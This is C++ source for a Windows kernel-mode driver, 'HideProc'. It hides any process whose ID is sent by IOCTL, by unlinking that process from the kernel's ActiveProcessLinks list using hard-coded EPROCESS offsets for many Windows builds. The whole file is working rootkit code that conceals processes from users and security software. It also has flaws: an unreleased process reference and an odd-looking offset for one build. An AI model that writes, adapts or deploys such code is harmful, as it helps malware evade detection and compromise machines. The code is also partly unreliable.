#include <ntifs.h>
#include <ntstatus.h>


#define DRIVER_NAME "HideProc"
#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _HIDE_PROCESS_REQUEST
{
	ULONG ProcessId;
} HIDE_PROCESS_REQUEST, * PHIDE_PROCESS_REQUEST;

ULONG ActiveProcessLinksOffset;


NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp);
NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp);
VOID DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS GetOffsets();

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
{
	UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"\\Device\\HideProc");
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\HideProc");
	NTSTATUS status;
	PDEVICE_OBJECT DeviceObject = NULL;

	status = IoCreateDevice(
		DriverObject,
		0,
		&driverName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject
	);
	
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create device", DRIVER_NAME);
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControl;
	DriverObject->DriverUnload = DriverUnload;

	DriverObject->Flags |= DO_BUFFERED_IO;

	status = IoCreateSymbolicLink(&symbolicLinkName, &driverName);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: Failed to create symbolic link", DRIVER_NAME);
		IoDeleteDevice(DeviceObject);
		return status;
	}

	if (!NT_SUCCESS(GetOffsets())) {
		DbgPrint("[%s]: Failed to get offsets", DRIVER_NAME);
		IoDeleteSymbolicLink(&symbolicLinkName);
		IoDeleteDevice(DeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	DbgPrint("[%s]: Driver loaded successfully", DRIVER_NAME);

	return STATUS_SUCCESS;
}


NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}	

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING symbolicLinkName = RTL_CONSTANT_STRING(L"\\??\\HideProc");
	IoDeleteSymbolicLink(&symbolicLinkName);
	if (DeviceObject != NULL)
	{
		IoDeleteDevice(DeviceObject);
	}
	DbgPrint("[%s]: Driver unloaded successfully", DRIVER_NAME);
}

NTSTATUS GetOffsets() {
	RTL_OSVERSIONINFOW pVersion = { 0 };
	pVersion.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

	RtlGetVersion(&pVersion);

	if (pVersion.dwBuildNumber == 9600) {
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pVersion.dwBuildNumber == 10240) {
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pVersion.dwBuildNumber == 10586) {
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pVersion.dwBuildNumber == 14393) {
		ActiveProcessLinksOffset = 0x2f0;
	}
	else if (pVersion.dwBuildNumber == 15063) {
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pVersion.dwBuildNumber == 16299) {
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pVersion.dwBuildNumber == 17134) {
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pVersion.dwBuildNumber == 17763) {
		ActiveProcessLinksOffset = 0x188;
	}
	else if (pVersion.dwBuildNumber == 18362) {
		ActiveProcessLinksOffset = 0x2e8;
	}
	else if (pVersion.dwBuildNumber >= 19041 && pVersion.dwBuildNumber <= 22631) {
		ActiveProcessLinksOffset = 0x448;
	}
	else if (pVersion.dwBuildNumber >= 26100) {
		ActiveProcessLinksOffset = 0x1d8;
	}
	else {
		ActiveProcessLinksOffset = 0x1d8;
	}

	if (ActiveProcessLinksOffset)
		return STATUS_SUCCESS;

	DbgPrint("[%s]: Unsupported Windows build %lu.", DRIVER_NAME, pVersion.dwBuildNumber);
	return STATUS_UNSUCCESSFUL;
}


NTSTATUS DeviceIoControl(PDEVICE_OBJECT, PIRP Irp)
{
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = NULL;

	if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_HIDE_PROCESS)
	{
		if (irpSp->Parameters.DeviceIoControl.InputBufferLength < sizeof(HIDE_PROCESS_REQUEST))
		{
			status = STATUS_BUFFER_TOO_SMALL;
			goto cleanup;
		}
		else {

			PHIDE_PROCESS_REQUEST ProcHide = (PHIDE_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
			ULONG ProcId = ProcHide->ProcessId;
			PLIST_ENTRY pList;
			PEPROCESS eProcess = NULL;

			status = PsLookupProcessByProcessId(UlongToHandle(ProcId), &eProcess);

			if (!NT_SUCCESS(status))
			{
				DbgPrint("[%s]: Failed to find process with PID %lu", DRIVER_NAME, ProcId);
				status = STATUS_NOT_FOUND;
				goto cleanup;
			}
			
			pList = (PLIST_ENTRY)((PCHAR)eProcess + ActiveProcessLinksOffset);

			pList->Flink->Blink = pList->Blink;
			pList->Blink->Flink = pList->Flink;

			pList->Flink = pList;
			pList->Blink = pList;

			DbgPrint("[%s]: Process with PID %lu hidden successfully", DRIVER_NAME, ProcId);
		}
	}


cleanup:
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}